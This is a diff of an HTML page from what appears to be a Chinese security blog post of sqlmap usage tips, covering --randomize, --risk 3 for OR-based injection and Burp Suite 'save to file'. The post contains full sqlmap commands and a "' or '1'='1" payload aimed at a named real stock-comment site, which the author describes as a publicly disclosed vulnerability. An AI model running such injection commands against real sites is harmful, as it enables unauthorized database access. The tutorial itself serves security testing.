@@ -11,24 +11,24 @@
     
 
     
-    <meta name="description" content="update2016-05-18:更新randomize
+    <meta name="description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file
 –randomize--randomize=RPARAM  Randomly change value for given parameter(s)
-sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会导致无法进入后续的逻辑从而无法检测SQL注入。使用randomize指">
+sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmap使用手册">
-<meta property="og:url" content="http://xdxd.love/2015/11/10/sqlmap-risk-参数/index.html">
+<meta property="og:url" content="http://xdxd.love/2015/11/10/sqlmap使用tips/index.html">
 <meta property="og:site_name" content="xd_xd's blog">
-<meta property="og:description" content="update2016-05-18:更新randomize
+<meta property="og:description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file
 –randomize--randomize=RPARAM  Randomly change value for given parameter(s)
-sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会导致无法进入后续的逻辑从而无法检测SQL注入。使用randomize指">
+sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会">
 <meta property="og:image" content="http://xdxd.love/images/sqlmaprisk1.png">
 <meta property="og:image" content="http://xdxd.love/images/sqlmaprisk2.png">
-<meta property="og:updated_time" content="2016-05-24T02:40:31.000Z">
+<meta property="og:updated_time" content="2016-05-25T07:08:35.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmap使用手册">
-<meta name="twitter:description" content="update2016-05-18:更新randomize
+<meta name="twitter:description" content="update2016-05-18:更新randomize2016-05-25:更新burpsuite save to file
 –randomize--randomize=RPARAM  Randomly change value for given parameter(s)
-sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会导致无法进入后续的逻辑从而无法检测SQL注入。使用randomize指">
+sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会">
 
     
     <link rel="alternative" href="/atom.xml" title="xd_xd&#39;s blog" type="application/atom+xml">
@@ -88,7 +88,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/11/10/sqlmap-risk-参数/" title="sqlmap使用手册" itemprop="url">sqlmap使用手册</a>
+      <a href="/2015/11/10/sqlmap使用tips/" title="sqlmap使用手册" itemprop="url">sqlmap使用手册</a>
   </h1>
   <p class="article-author">By
        
@@ -104,19 +104,21 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#burpsuite_save_to_file"><span class="toc-number">4.</span> <span class="toc-text">burpsuite save to file</span></a></li></ol>
 		
 		</div>
 		
-		<h1 id="update">update</h1><p>2016-05-18:更新randomize</p>
+		<h1 id="update">update</h1><p>2016-05-18:更新randomize<br>2016-05-25:更新burpsuite save to file</p>
 <h1 id="–randomize">–randomize</h1><pre><code>--randomize=RPARAM  Randomly change value <span class="keyword">for</span> given <span class="function"><span class="title">parameter</span><span class="params">(s)</span></span>
 </code></pre><p>sqlmap真的是可以适用非常多的场景。有些时候，比如注册的时候用户只能使用一次，下次使用会有先检查用户名的逻辑，这样就会导致无法进入后续的逻辑从而无法检测SQL注入。使用randomize指定这个参数随机就可以了。</p>
 <h1 id="risk_3">risk 3</h1><p>测试一个注入点，手工测试验证应该存在注入但是用sqlmap没跑出来。测试发现需要指定risk 3，sqlmap才会使用or语句进行测试，才可以识别出这个注入点。</p>
+<p>or boolean 需要risk 3 level 3</p>
 <pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">5</span> --dbs --dbms=mysql --risk <span class="number">3</span>
 </code></pre><p>这是乌云上一个公开的漏洞。之所以用and无法识别出来是因为code的参数本身是无效的，数据查询的结果为空，所以再拼接and语句，查询条件还是false。<br><img src="/images/sqlmaprisk1.png" alt=""><br>可以直接在code参数后面拼接一个or语句。然后再拼接and语句就可以正常注入了。<br><img src="/images/sqlmaprisk2.png" alt=""></p>
 <p>所以这里可以直接使用risk 3参数或者在code参数后面拼or语句。</p>
 <pre><code>python sqlmap<span class="class">.py</span> -u <span class="string">"http://comment.10jqka.com.cn/api/stock/index.php?module=concept&amp;code=8820309115951' or '1'='1&amp;name="</span> --random-agent -v <span class="number">1</span> -<span class="tag">p</span> <span class="tag">code</span> --level <span class="number">1</span> --dbs --dbms=mysql --risk <span class="number">1</span>
-</code></pre>  
+</code></pre><h1 id="burpsuite_save_to_file">burpsuite save to file</h1><p>测试一个multipart/form-data里参数的注入，返现复制请求文本到文件中，在使用sqlmap r参数指定请求更自己在burpsuite测试的结果不一样，通过对比发现，复制的请求中忽略了原始请求中每个参数后面的%0d符号。导致服务端无法进行了不一样的处理。直接使用burpsuite中右键save to file保存请求，再使用sqlmap r参数就可以。</p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
@@ -138,7 +140,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://xdxd.love/2015/11/10/sqlmap-risk-参数/" data-title="sqlmap使用手册 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
+	  <div data-url="http://xdxd.love/2015/11/10/sqlmap使用tips/" data-title="sqlmap使用手册 | xd_xd&#39;s blog" data-tsina="5256150165" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -172,7 +174,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="2015/11/10/sqlmap-risk-参数/" data-title="sqlmap使用手册" data-url="http://xdxd.love/2015/11/10/sqlmap-risk-参数/"></div>
+	<div class="ds-thread" data-thread-key="2015/11/10/sqlmap使用tips/" data-title="sqlmap使用手册" data-url="http://xdxd.love/2015/11/10/sqlmap使用tips/"></div>
 </section>
 
 
@@ -182,7 +184,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#update"><span class="toc-number">1.</span> <span class="toc-text">update</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#–randomize"><span class="toc-number">2.</span> <span class="toc-text">–randomize</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#risk_3"><span class="toc-number">3.</span> <span class="toc-text">risk 3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#burpsuite_save_to_file"><span class="toc-number">4.</span> <span class="toc-text">burpsuite save to file</span></a></li></ol>
  
   </div>
 
@@ -240,7 +242,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 		  
 		
 		  
-			<li><a href="/categories/移动安全/" title="移动安全">移动安全<sup>5</sup></a></li>
+			<li><a href="/categories/移动安全/" title="移动安全">移动安全<sup>4</sup></a></li>
 		  
 		
 		  
@@ -333,7 +335,7 @@ sqlmap真的是可以适用非常多的场景。有些时候，比如注册的�
 			
 		
 			
-				<li><a href="/tags/签名逆向/" title="签名逆向">签名逆向<sup>1</sup></a></li>
+				<li><a href="/tags/物联网/" title="物联网">物联网<sup>1</sup></a></li>
 			
 		
 			
